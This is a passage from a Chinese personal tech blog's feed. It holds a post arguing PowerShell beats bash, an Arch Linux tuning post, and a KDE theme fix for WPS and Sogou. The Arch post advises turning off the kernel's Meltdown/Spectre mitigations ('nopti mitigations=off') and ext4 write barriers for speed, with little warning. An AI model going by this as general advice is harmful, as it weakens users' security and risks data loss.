Rust, 我又觉得强类型 &amp;&amp; 静态类型实在是太棒了! 错误就是应该尽早被发现!</p><p>pwsh, 作为给系统管理员用的脚本语言当然肯定不会是强类型 &amp;&amp; 静态类型的, 那样太残忍了.</p><p>不过 pwsh 的类型系统比 bash 就不知道高到哪里去了.</p><p>基于 .Net 的 pwsh 默认就支持了大量类型 <code>[array],[bool],[byte],[char],[datetime],[decimal],[double],[guid],[hashtable],[int16],[int32],[int],[int64],[long],[nullable],[psobject],[regex],[sbyte].[scriptblock],[single],[float],[string],[switch],[timespan],[type],[uint16],[uint32],[uint64],[xml]</code>, 如果还嫌不够的话, .Net 里面还有大量好东西可以掏, 什么 HashSet 啊, List 啊, Queue 啊, Stack 啊, 应有尽有.</p><p>比 bash 不知道高到哪里去了! (强调</p><p>而且 pwsh 还有一个很棒的功能, 就是类型标注. 当然不是 Python 那样纯粹标一下给人看 (逃, 当然现在很多 IDE &amp; lint 工具都能识别 type hint</p><p>pwsh 的类型标注可以固定某个变量的类型. 比如</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[int]<span class="variable">$n</span> = <span class="number">2233</span></span><br><span class="line"><span class="variable">$n</span> = <span class="number">233</span>   <span class="comment"># OK</span></span><br><span class="line"><span class="variable">$n</span> = <span class="string">"asd"</span> <span class="comment"># ERROR!</span></span><br><span class="line"><span class="variable">$n</span> = <span class="string">"233"</span> <span class="comment"># 比较艹蛋的一点是这样又可以, 隐式类型转换坑爹啊</span></span><br><span class="line"></span><br><span class="line">[int[]]<span class="variable">$list</span> = @()</span><br><span class="line"><span class="variable">$list</span> += <span class="number">1</span>   <span class="comment"># OK</span></span><br><span class="line"><span class="variable">$list</span> += <span class="string">"a"</span> <span class="comment"># ERROR!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> add([int]<span class="variable">$a</span>, [int]<span class="variable">$b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span> + <span class="variable">$b</span></span><br><span class="line">&#125;</span><br><span class="line">add <span class="number">1</span> <span class="number">2</span>     <span class="comment"># OK</span></span><br><span class="line">add <span class="string">"a"</span> <span class="string">"b"</span> <span class="comment"># ERROR!</span></span><br></pre></td></tr></table></figure><p>注意到上面指定了函数参数的类型, 其实这还可以更棒</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> add() &#123;</span><br><span class="line">    <span class="keyword">param</span>(</span><br><span class="line">    [ValidateNotNull]</span><br><span class="line">    [int]</span><br><span class="line">    <span class="variable">$a</span>,</span><br><span class="line">        [ValidateNotNull]</span><br><span class="line">    [int]</span><br><span class="line">    <span class="variable">$b</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">process</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$a</span> + <span class="variable">$b</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">add <span class="literal">$null</span> <span class="number">2</span> <span class="comment"># ERROR!</span></span><br></pre></td></tr></table></figure><p>这就是 pwsh 的 <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_functions_advanced_parameters?view=powershell-6" target="_blank" rel="noopener">advanced_parameters</a></p><h2 id="可读性高"><a class="headerlink" href="#可读性高"></a>可读性高</h2><p>这个其实和内置功能那一节的内容紧密相关, 正是因为很多功能都内置了, 语法才会统一.<br>不过我还是想单独拆一个标题出来. 因为 bash 脚本的可读性是真 tm 糟糕.</p><p>Linux 上的这些 shell, 充斥着大量匪夷所思的缩写&amp;符号.</p><table><thead><tr><th>bash</th><th>pwsh</th></tr></thead><tbody><tr><td><code>[[ &quot;$string&quot; == *&quot;$substring&quot;* ]]</code></td><td><code>&quot;$string&quot;.Contains(&quot;$substring&quot;)</code></td></tr><tr><td><code>${\#array[@]}</code></td><td><code>$array.Length</code></td></tr><tr><td><code>${string#substring}</code></td><td><code>$string -replace &quot;^$substring&quot;</code></td></tr><tr><td><code>${string%substring}</code></td><td><code>$string -replace &quot;$substring$&quot;</code></td></tr><tr><td><code>$@</code> OR <code>$*</code></td><td><code>$args</code></td></tr></tbody></table><p>可能以前存储空间很宝贵吧, 然而现在机械硬盘起步1T, 省这几个字符有啥用啊!!</p><p>而且 pwsh 的内部命令(一般称为 cmdlet), 非常有规律. 都是 动词+名词 的组合, 而且常用命令都有别名(alias), 允许你少打几个字</p><table><thead><tr><th>other/alias</th><th>pwsh</th></tr></thead><tbody><tr><td>rm</td><td>Remove-Item</td></tr><tr><td>md</td><td>New-Item</td></tr><tr><td>cd</td><td>Set-Location</td></tr><tr><td>cp</td><td>Copy-Item</td></tr><tr><td>mv</td><td>Move-Item</td></tr></tbody></table><p>看, pwsh 的命令是何等的规律! 总有人说啥 pwsh 的学习成本高, 不如学 xxx. 这我是不信的, pwsh 的这种一致性加上流行度, 学习 pwsh 远比你去学一个没多少人用的&quot;用户友好&quot;的 shell 要好.</p><p>而且 pwsh 对内部命令的补全非常棒棒, 像补全函数名, 补全参数什么的都是小 case, pwsh 甚至能根据管道前的命令来补全</p><p>举例来说,   <code>xxx | ForEach-Object { $_. }</code> 这样的命令, 在<code>.</code>处按 TAB, pwsh 就会根据 XXX 的返回值类型来补全. (类型系统万岁!)</p><h2 id="面向对象"><a class="headerlink" href="#面向对象"></a>面向对象</h2><p>这是一个非常棒的特点, pwsh 是一个面向对象的 shell. cmdlets 的输出是对象, 而不是字符串.</p><p>举例来说, 我想获得当前系统中内存占用超过 200 mb 的进程 (这里我又要点名批评一下 C++ 写的 telegram-desktop <a href="https://github.com/telegramdesktop/tdesktop/issues/2464" target="_blank" rel="noopener">telegramdesktop/tdesktop#2464</a>, <s>请立即使用 Rust</s></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">Get-Process</span> | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.WS <span class="nomarkup">-gt</span> <span class="number">200</span>mb &#125;</span><br><span class="line"><span class="comment"># 使用别名的话可以写成 gps | ? &#123; $_.WS -ge 200mb &#125;</span></span><br><span class="line"></span><br><span class="line"> NPM(K)    PM(M)      WS(M)     CPU(s)      Id  SI ProcessName</span><br><span class="line"> ------    -----      -----     ------      --  -- -----------</span><br><span class="line">      <span class="number">0</span>     <span class="number">0.00</span>     <span class="number">206.59</span>     <span class="number">334.50</span>    <span class="number">1033</span> <span class="number">032</span> plasmashell</span><br><span class="line">      <span class="number">0</span>     <span class="number">0.00</span>     <span class="number">226.43</span>     <span class="number">773.39</span>    <span class="number">1027</span> <span class="number">977</span> kwin_x11</span><br><span class="line">      <span class="number">0</span>     <span class="number">0.00</span>     <span class="number">226.46</span>     <span class="number">135.83</span>    <span class="number">8116</span> <span class="number">058</span> chromium</span><br><span class="line">      <span class="number">0</span>     <span class="number">0.00</span>     <span class="number">236.60</span>      <span class="number">97.72</span>   <span class="number">14990</span> <span class="number">977</span> Typora</span><br><span class="line">      <span class="number">0</span>     <span class="number">0.00</span>     <span class="number">392.42</span>     <span class="number">394.97</span>    <span class="number">6366</span> <span class="number">030</span> telegram-deskto</span><br><span class="line">      <span class="number">0</span>     <span class="number">0.00</span>     <span class="number">402.94</span>     <span class="number">878.92</span>    <span class="number">1381</span> <span class="number">058</span> chromium</span><br></pre></td></tr></table></figure><blockquote><p>眼尖的小朋友可能会发现, &quot;telegram-deskto&quot; 好像有点奇怪......默默甩 issue <a href="https://github.com/dotnet/corefx/issues/34437" target="_blank" rel="noopener">dotnet/corefx#34437</a></p></blockquote><p>反观 bash, 这个时候只能上 awk 了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➤ ps aux | awk <span class="string">'$4 * 8192 / 100 &gt; 200'</span> <span class="comment"># 为了让输出好看点我删掉了命令行参数</span></span><br><span class="line">aloxaf    1027  4.9  2.9 3279432 232108 ?      Sl   11:04  14:04 /usr/bin/kwin_x11</span><br><span class="line">aloxaf    1033  2.1  2.6 1395968 212200 ?      Sl   11:04   6:06 /usr/bin/plasmashell</span><br><span class="line">aloxaf    1381  5.3  5.2 1423580 414932 ?      Sl   11:06  15:05 /usr/lib/chromium/chromium</span><br><span class="line">aloxaf    6366  3.0  5.0 1956732 404088 ?      Sl   11:50   7:09 /usr/bin/telegram-desktop</span><br><span class="line">aloxaf    8116  1.0  2.8 883064 225856 ?       Sl   11:59   2:28 /usr/lib/chromium/chromium</span><br><span class="line">aloxaf   14990  5.2  3.1 1792528 249992 ?      Sl   14:46   3:11 /usr/share/typora/Typora</span><br></pre></td></tr></table></figure><p>如果再按照内存使用量从大到小排序呢? pwsh 再接个 <code>Sort-Object -Descending -Property WS</code> 就行了, bash 的话接个 <code>sort -rk 4</code></p><p>有没有发现什么. bash 的可读性太 TM 糟糕了——充斥着魔术数字. 这个 4 究竟代表了什么? 从代码中看不出来, 输出以后更是 van 全看不出来!</p><p>为啥 bash 需要 sed, awk, grep 等工具? 因为它太 TM 弱了, 也因为大家都只输出字符串.<br>这玩意儿对人倒是友好, 但是对机器一点都不友好.<br>这设计实在是太糟糕了, 一旦想让机器来处理这些给人看的格式, 代码就会变成不是给人看的.<br>我也不是说大家一定要面向对象, 好歹大家一起定义一个数据交换格式, 这样岂不美哉?</p><p>举例来说, 大家都用 JSON 交换数据, 然后就可以这样写 <code>ps aux --export | where '_[&quot;mem&quot;] * 8192 / 100 &gt; 200' | to-table</code>, 这不是很好么?? 比字符串传来传去不知道高到哪里去了!!</p><h1 id="缺点"><a class="headerlink" href="#缺点"></a>缺点</h1><h2 id="垃圾管道"><a class="headerlink" href="#垃圾管道"></a>垃圾管道</h2><p>pwsh 的管道, 一方面非常棒, 传递的是对象, 由此搭配 <code>Select-Object</code>, <code>ForEach-Object</code>这类命令能够实现令 bash 望尘莫及的行云流水的操作.</p><p>另一方面, 管道是真滴慢. 无数 pwsh 优化指南第一句肯定就是少用管道 (这点和 cmd 挺像的, cmd 的管道慢是因为每次管道都会开启一个新的 cmd 进程, 写批处理的时候为了性能很多时候都会选择重定向到文件再读入 ( M$ 这是什么垃圾实现</p><p>而且, pwsh 的 <code>&gt;</code> 其实是 <code>| Out-File</code> 的别名, 所以不要以为重定向就能提高速度.</p><p>那该怎么办呢? 内部命令好说, 一般有参数可以让你直接传对象过去, 然而都是外部命令就呵呵了.</p><p>距离来说 <code>seq 12345 | rg 12345</code>这样一个简单的命令竟然花了 0.76 s</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">Measure-Command</span> -Expression &#123;seq <span class="number">12345</span> | rg <span class="number">12345</span>&#125; | select TotalMilliseconds</span><br><span class="line"></span><br><span class="line">TotalMilliseconds</span><br><span class="line">-----------------</span><br><span class="line">         <span class="number">759.6631</span></span><br></pre></td></tr></table></figure><p>反观 bash , 简直就是吊打!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➤ time seq 12345 | rg 12345</span><br><span class="line">12345</span><br><span class="line">seq 12345  0.00s user 0.00s system 84% cpu 0.002 total</span><br><span class="line">rg 12345  0.00s user 0.00s system 92% cpu 0.005 total</span><br></pre></td></tr></table></figure><p>心累啊, 大概 M$ 一开始觉得反正 Windows 上又没啥工具给你调用...结果怎么突然就跨平台了呢?</p><h2 id="与-native-程序交互"><a class="headerlink" href="#与-native-程序交互"></a>与 native 程序交互</h2><p>pwsh 是面向对象的, 这是好的. cmdlets 的返回值是一个对象, 这是 pwsh 自己可以保证的. 然而外部命令呢?</p><p>显然, 外部命令的输出只能当成字符串来处理了...</p><p>等等? 你确定是字符串??</p><p><code>cat /usr/bin/ls</code>——这玩意儿会是一个字符串吗? 不, 不可能的.</p><p>然而 pwsh 真的就是按我上面所说的来处理的...</p><p>这就导致了你让 pwsh 处理外部命令给出的任何它不能完美解释为字符串的玩意儿时的迷のbug, 包括二进制数据, 非 UTF-8 编码.</p><p>大部分情况下, 我们可以通过 <code>-o FILE</code> 输出到文件, 然后再用指定参数的 <code>Get-Content</code> 读入来解决, 然而这太不爽了, 而且有些命令根本没有这个功能! 这个时候就要点名批评 <code>xclip</code>, 它倒是有 <code>-o</code>, 然而这只会把数据输出到 stdout. 当我在 pwsh 里试图用 xclip 从剪贴板里面导出一张图片时, bug 就这样发生了(亏我能立马排查出是管道的问题...</p><h2 id="上面两个问题的解决方案"><a class="headerlink" href="#上面两个问题的解决方案"></a>上面两个问题的解决方案</h2><ol><li>sh -c 'command1 | command2 &gt; file', 简单粗暴, 然而不雅观</li><li>Start-Process 然后手动读 raw byte, 这个方法我至今还没成功过</li><li>Use-RawPipeline(Windows) 和 Use-PosixPipeline(Linux), 大概是目前情况下最好的解决方案了, 绕过了 pwsh 的管道传递数据, 不过后者尚处于 develop 阶段 (快 PR</li></ol><h2 id="启动斯必得"><a class="headerlink" href="#启动斯必得"></a>启动斯必得</h2><p>pwsh 的启动速度真的太慢了, 和 zsh 差 20 倍啊.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➤ time zsh -c <span class="string">'exit'</span></span><br><span class="line">zsh -c <span class="string">'exit'</span>  0.01s user 0.00s system 94% cpu 0.018 total</span><br><span class="line">➤ time pwsh -nop -c <span class="string">'exit'</span></span><br><span class="line">pwsh -nop -c <span class="string">'exit'</span>  0.38s user 0.05s system 118% cpu 0.360 total</span><br></pre></td></tr></table></figure><p>而且这可是没有任何配置的 pwsh 啊!!</p><p>我本来试了试 oh-my-posh, 发现颜值还真挺高的, 然而这样一来启动速度就到了秒级. 吓得我赶紧卸载掉了.<br>所以虽然我大赞了一通 pwsh, 我日常交互式的话应该还是不会使用它, 只是写脚本用用.</p><p>对了, 此处还要强调一下, pwsh 即使是执行脚本也会加载 $PROFILE 里的内容, 除非指定了 <code>-nop</code>(-NoProfile) 参数. 所以如果你的 pwsh 用了重量级配置, 脚本的 shebang 最好加上 -nop 参数</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;我就是饿死, 死外面, 从外面跳下去, 也不会用 M$ 的垃圾 PowerShell !&lt;/p&gt;
&lt;p&gt;...&lt;/p&gt;
&lt;p&gt;真香!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;NOTE: 这是一篇黑 bash 吹 PowerShell(以下简称 pwsh) 的文章, bash 死忠粉以及软黑请退散.&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/categories/linux/"/>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/tags/linux/"/>
    
      <category term="powershell" scheme="https://www.aloxaf.com/tags/powershell/"/>
    
  </entry>
  
  <entry>
    <title>Arch Linux 杂七杂八的优化</title>
    <link href="https://www.aloxaf.com/2018/11/arch_optimize/"/>
    <id>https://www.aloxaf.com/2018/11/arch_optimize/</id>
    <published>2018-11-18T14:56:27.000Z</published>
    <updated>2018-11-19T13:05:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>发现无聊时刷 <a href="https://wiki.archlinux.org/" target="_blank" rel="noopener">Arch Wiki</a> 也挺有趣的, 记录一下自己干了啥吧. 毕竟有些配置没法放到 dotfiles 里. 记录一下以后翻起来也方便.</p><a id="more"></a><h1 id="内核"><a class="headerlink" href="#内核"></a>内核</h1><h2 id="nopti"><a class="headerlink" href="#nopti"></a>nopti</h2><p>参考: <a href="https://bbs.archlinux.org/viewtopic.php?pid=1759527#p1759527" target="_blank" rel="noopener">Performance degradation after Meltdown mitigation?</a></p><p>打开 <code>/etc/default/grub</code>, 给 <code>GRUB_CMDLINE_LINUX_DEFAULT</code>添加<code>nopti mitigations=off</code>参数, 禁用上次 intel Meltdown 漏洞的补丁.</p><p>这个补丁实测严重影响<strong>系统调用</strong>性能, 大约下降 70%. 虽然实际上应该没啥程序会疯狂 syscall ....但我还是要关掉它!</p><h1 id="硬盘"><a class="headerlink" href="#硬盘"></a>硬盘</h1><h2 id="ssd"><a class="headerlink" href="#ssd"></a>SSD</h2><p>参考: <a href="https://wiki.archlinux.org/index.php/Solid_state_drive" target="_blank" rel="noopener">Solid state drive</a></p><h3 id="trim"><a class="headerlink" href="#trim"></a>TRIM</h3><p>通过 <code>hdparm -I /dev/sda | grep TRIM</code> 检验是否支持, 挂载参数添加 <code>discard</code> 以启用.</p><h3 id="调度器"><a class="headerlink" href="#调度器"></a>调度器</h3><p>可以通过 <code>cat /sys/block/sda/queue/scheduler</code>查看当前调度器和可用调度器, 默认应该是 <code>bfq</code>.</p><p>据 wiki 所说, SSD 性能强劲, 因此简单的调度算法反而适合 SSD, 如 <code>noop</code>, <code>deadline</code></p><p>往 <code>/etc/udev/rules.d/60-ioschedulers.rules</code> 里写入如下规则, 为 SSD 启用 <code>mq-deadline</code> 调度器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ACTION==&quot;add|change&quot;, KERNEL==&quot;sd[a-z]|mmcblk[0-9]*|nvme[0-9]*&quot;, ATTR&#123;queue/rotational&#125;==&quot;0&quot;, ATTR&#123;queue/scheduler&#125;=&quot;mq-deadline&quot;</span><br></pre></td></tr></table></figure><h2 id="ext4-性能优化"><a class="headerlink" href="#ext4-性能优化"></a>Ext4 性能优化</h2><p>参考: <a href="https://wiki.archlinux.org/index.php/Ext4#Improving_performance" target="_blank" rel="noopener">Ext4#Improving_performance</a></p><h3 id="禁止更新访问时间戳"><a class="headerlink" href="#禁止更新访问时间戳"></a>禁止更新访问时间戳</h3><p>想了想我似乎没有需要知道某个文件上次被访问是啥时候的需求, 于是 fstab 添加<code>noatime</code> 参数禁用之.</p><p>如果有这个需求的话, 也可以用 <code>relatime</code>/<code>strictatime</code>搭配<code>lazytime</code>来减小写入硬盘的次数. 虽然系统崩溃时可能导致访问时间未更新, 不过这显然不是什么大事......</p><h3 id="关闭屏障"><a class="headerlink" href="#关闭屏障"></a>关闭屏障</h3><p>虽然没懂到底是什么鬼(保证写入的正确性?), 不过wiki上说有备用电源就可以安全关闭.</p><p>笔记本, 不怕断电, 果断添加参数<code>barrier=0</code>禁用.</p><h3 id="禁用日志"><a class="headerlink" href="#禁用日志"></a>禁用日志</h3><p>首先卸载磁盘, 然后 <code>tune2fs -O &quot;^has_journal&quot; /dev/sdXN</code></p><p>以前关掉过, 后来想了想还是打开了...为了我能够安心地强制关机......</p><h3 id="加速日志"><a class="headerlink" href="#加速日志"></a>加速日志</h3><p>根据这篇文章, 最棒的方法应该是单独使用一个分区作为日志分区然后启用 <code>journal_async_commit</code>:<a href="https://raid6.com.au/posts/fs_ext4_external_journal/" target="_blank" rel="noopener">ext4: using external journal to optimise performance</a>. 速度最多能提升到原来的三倍, 妙啊妙啊!</p><p>Mark 一下, 暂时不打算弄.</p><h2 id="fstab"><a class="headerlink" href="#fstab"></a>fstab</h2><p>参考: <a href="https://wiki.archlinux.org/index.php/Fstab" target="_blank" rel="noopener">fstab</a></p><h3 id="使用-label"><a class="headerlink" href="#使用-label"></a>使用 LABEL</h3><p>fstab 默认使用的是内核名称描述符(eg. /dev/sda1)来指示挂载设备. 这通常问题不大.</p><p>然而当你加了一块硬盘(包括移动硬盘), 就可能会导致描述符的改变, 从而出现无法启动的状况. 到群里问了大佬们, 大佬们有推荐用 UUID, 有推荐用 LABEL 的. 个人感觉 LABEL 比较好懂 (</p><p>创建 LABEL 的方法见: <a href="https://wiki.archlinux.org/index.php/Persistent_block_device_naming#by-label" target="_blank" rel="noopener">Persistent_block_device_naming#by-label</a></p><p>以 ext4 为例, 使用 <code>e2label /dev/XXX &lt;label&gt;</code>创建 LABEL, 然后就可以在 fstab 里使用 <code>LABEL=xxx</code> 的方式来指示挂载设备了, 不用担心因为插拔硬盘导致奇怪的问题.</p><h3 id="自动挂载移动硬盘"><a class="headerlink" href="#自动挂载移动硬盘"></a>自动挂载移动硬盘</h3><p>每次手动挂载很麻烦, 直接添加到 fstab 的话没插移动硬盘就会 error, 这时就要使用 <code>nofail</code> 参数, 像这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LABEL=backup    /mnt/backup     ext4    defaults,noatime,nofail         0 2</span><br></pre></td></tr></table></figure><p>第一次用貌似会遇到无法写入的问题, 使用 <code>sudo chown -R $USER:$USER /mnt/backup</code> 更改一次所有权就行了</p><h3 id="自动挂载大分区"><a class="headerlink" href="#自动挂载大分区"></a>自动挂载大分区</h3><p>因为一直以来都以 Linux 作为主力系统. 然后觉得 ntfs-3g 实在不可靠......于是把原来 NTFS 的资料盘转成 ext4 了.</p><p>不过资料盘用得比较少, 可以用 <code>noauto,x-systemd.automount</code> 参数使得在访问时才挂载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LABEL=storage   /mnt/storage    ext4    defaults,noatime,noauto,x-systemd.automount             0 2</span><br></pre></td></tr></table></figure><p>(第一次用还是需要 chown 好像....)</p><h1 id="pacman"><a class="headerlink" href="#pacman"></a>pacman</h1><p>参考: <a href="https://wiki.archlinux.org/index.php/Pacman" target="_blank" rel="noopener">pacman</a></p><h2 id="pacman-conf"><a class="headerlink" href="#pacman-conf"></a>pacman.conf</h2><p><code># Misc options</code>开启 <code>Color</code> 和 <code>VerbosePkgLists</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Misc options</span></span><br><span class="line"><span class="comment">#UseSyslog</span></span><br><span class="line">Color</span><br><span class="line"><span class="comment">#TotalDownload</span></span><br><span class="line">CheckSpace</span><br><span class="line">VerbosePkgLists</span><br></pre></td></tr></table></figure><p>作用: pacman 彩色输出 &amp;&amp; 升级时使用三栏显示</p><h2 id="自动清理软件包缓存"><a class="headerlink" href="#自动清理软件包缓存"></a>自动清理软件包缓存</h2><p>创建 <code>/usr/share/libalpm/hooks/clean-cache.hook</code>, 内容如下</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Trigger]</span></span><br><span class="line"><span class="attr">Operation</span> = Remove</span><br><span class="line"><span class="attr">Operation</span> = Install</span><br><span class="line"><span class="attr">Operation</span> = Upgrade</span><br><span class="line"><span class="attr">Type</span> = Package</span><br><span class="line"><span class="attr">Target</span> = *</span><br><span class="line"></span><br><span class="line"><span class="section">[Action]</span></span><br><span class="line"><span class="attr">Description</span> = Cleaning up old packages...</span><br><span class="line"><span class="attr">When</span> = PostTransaction</span><br><span class="line"><span class="attr">Exec</span> = /usr/bin/paccache -rvk3</span><br></pre></td></tr></table></figure><p>作用: 每次升级软件包后清理最近三次以前的软件包</p><h1 id="makepkg"><a class="headerlink" href="#makepkg"></a>makepkg</h1><p>参考: <a href="https://wiki.archlinux.org/index.php/Makepkg" target="_blank" rel="noopener">makepkg</a></p><h2 id="makepkg-conf"><a class="headerlink" href="#makepkg-conf"></a>.makepkg.conf</h2><p>新建 <code>~/.makepkg.conf</code>, 写入如下内容pacman</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">CFLAGS</span>=<span class="string">"-march=native -O2 -pipe -fno-plt"</span></span><br><span class="line"><span class="attr">CXXFLAGS</span>=<span class="string">"-march=native -O2 -pipe -fno-plt"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">MAKEFLAGS</span>=<span class="string">"-j$(nproc)"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">BUILDENV</span>=(!distcc color ccache !check !sign)</span><br><span class="line"><span class="attr">BUILDDIR</span>=/tmp/makepkg</span><br><span class="line"></span><br><span class="line"><span class="attr">COMPRESSXZ</span>=(xz -c -z - --threads=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>作用: 优化生成的二进制文件 &amp;&amp;  加快编译速度 &amp;&amp; 加快软件包生成速度</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;发现无聊时刷 &lt;a href=&quot;https://wiki.archlinux.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Arch Wiki&lt;/a&gt; 也挺有趣的, 记录一下自己干了啥吧. 毕竟有些配置没法放到 dotfiles 里. 记录一下以后翻起来也方便.&lt;/p&gt;
    
    </summary>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/categories/linux/"/>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>解决 KDE 暗色主题下 WPS &amp; 搜狗拼音设置字体颜色不正常的问题</title>
    <link href="https://www.aloxaf.com/2018/11/kde_dark_theme/"/>
    <id>https://www.aloxaf.com/2018/11/kde_dark_theme/</id>
    <published>2018-11-14T12:58:52.000Z</published>
    <updated>2018-11-14T12:58:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>这是一个比较迷的 bug, 困扰了我很久, 然而又不知道为什么.</p><p>今天在群里看到有人提到了这个问题, 简单地讲就是程序只有一部分跟随系统主题, 然后就会产生各种诡异的效果.</p><p>比如</p><ul><li>搜狗, 字体跟随系统变成浅色, 背景没有变, 变成浅色背景+浅色字体, 亮瞎眼组合</li><li>WPS 表格, 表格背景是黑的....究极の难看</li><li>WPS 文字, 字体也变浅色了, 不仅亮瞎眼. 如果强行调成黑色的话, 在 Windows 上就会变亮瞎眼...</li></ul><a id="more"></a><p>记录一下解决方案:</p><p>首先在 设置-应用程序风格-GNOME程序风格 里设置一个亮色主题</p><p>然后修改 <code>/usr/share/applications/wps-office-{wps,wpp,et}.desktop</code> 和 <code>fcitx-ui-sogou-qimpanel.desktop</code> , 给 <code>Exec</code> 项添加参数 <code>-style gtk+</code></p><p>以 WPS 为例, Before</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Exec</span>=/usr/bin/wps %f</span><br></pre></td></tr></table></figure><p>After</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Exec</span>=/usr/bin/wps -style gtk+ %f</span><br></pre></td></tr></table></figure><p>原理: 把这堆不守规矩的程序踢给 GTK+</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是一个比较迷的 bug, 困扰了我很久, 然而又不知道为什么.&lt;/p&gt;
&lt;p&gt;今天在群里看到有人提到了这个问题, 简单地讲就是程序只有一部分跟随系统主题, 然后就会产生各种诡异的效果.&lt;/p&gt;
&lt;p&gt;比如&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;搜狗, 字体跟随系统变成浅色, 背景没有变, 变成浅色背景+浅色字体, 亮瞎眼组合&lt;/li&gt;
&lt;li&gt;WPS 表格, 表格背景是黑的....究极の难看&lt;/li&gt;
&lt;li&gt;WPS 文字, 字体也变浅色了, 不仅亮瞎眼. 如果强行调成黑色的话, 在 Windows 上就会变亮瞎眼...&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/categories/linux/"/>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>如何在 Python3 中让 &#39;a&#39; is &#39;b&#39; 为 True</title>
    <link href="https://www.aloxaf.com/2018/10/egg_pain_python/"/>
    <id>https://www.aloxaf.com/2018/10/egg_pain_python/</id>
    <published>2018-10-28T06:24:05.000Z</published>
    <updated>2018-10-28T13:08:33.000Z</updated>
    
